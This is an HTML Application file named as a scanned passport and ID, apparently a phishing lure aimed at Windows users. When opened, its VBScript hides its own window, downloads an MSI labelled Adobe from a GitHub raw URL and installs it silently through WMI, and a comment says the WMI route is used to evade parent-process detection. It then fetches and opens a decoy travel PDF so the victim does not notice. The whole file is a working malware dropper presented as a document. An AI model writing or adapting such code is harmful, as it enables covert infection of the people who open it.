<!-- language: HTML/HTA, file: Scanned_Passport_And_ID.hta, target: Windows 10/11 -->
<html>
<head>
<title>Document</title>
<HTA:APPLICATION
    ID="Doc"
    APPLICATIONNAME="Document"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
/>
</head>
<script language="VBScript">
Sub Window_OnLoad
    self.ResizeTo 0, 0
    self.MoveTo -3000, -3000

    Dim fso, sh, qs, tmp
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set sh  = CreateObject("WScript.Shell")
    qs  = Chr(34)
    tmp = sh.ExpandEnvironmentStrings("%TEMP%")

    ' ---------- fetch MSI via MSXML2 (HTTPS, GitHub raw) ----------
    Dim msiUrl, msiPath, http, stream
    msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
    msiPath = tmp & "\" & Replace(Replace(CreateObject("Scriptlet.TypeLib").GUID, "{", ""), "}", "") & ".msi"

    On Error Resume Next
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    http.open "GET", msiUrl, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0"
    http.send
    On Error GoTo 0

    Dim fetchOk
    fetchOk = False
    If http.status = 200 Then
        On Error Resume Next
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile msiPath, 2
        stream.Close
        On Error GoTo 0
        If fso.FileExists(msiPath) Then
            If fso.GetFile(msiPath).Size > 100000 Then fetchOk = True
        End If
    End If

    ' ---------- install via WMI — parent is WmiPrvSE, not mshta ----------
    If fetchOk Then
        Dim wmi, startup, cmdLine, pid
        Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2:Win32_Process")
        Set startup = wmi.Get("Win32_ProcessStartup").SpawnInstance_
        startup.ShowWindow = 0
        cmdLine = "msiexec.exe /i """ & msiPath & """ /qn /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v """ & tmp & "\msi_install.log"" "
        wmi.Create cmdLine, Null, startup, pid
    End If

    ' ---------- decoy PDF ----------
    WScript.Sleep 20000
    Dim pdfUrl, pdfPath, ph, ps, edgeExe
    pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
    pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"

    On Error Resume Next
    Set ph = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    ph.open "GET", pdfUrl, False
    ph.setRequestHeader "User-Agent", "Mozilla/5.0"
    ph.send
    If ph.status = 200 Then
        Set ps = CreateObject("ADODB.Stream")
        ps.Type = 1
        ps.Open
        ps.Write ph.responseBody
        ps.SaveToFile pdfPath, 2
        ps.Close
        edgeExe = sh.ExpandEnvironmentStrings("%ProgramFiles(x86)%") & "\Microsoft\Edge\Application\msedge.exe"
        If fso.FileExists(edgeExe) Then
            sh.Run qs & edgeExe & qs & " " & qs & pdfPath & qs, 1, False
        Else
            CreateObject("Shell.Application").ShellExecute pdfPath, "", "", "open", 1
        End If
    End If
    On Error GoTo 0

    self.close
End Sub
</script>
<body bgcolor="#000000"></body>
</html>
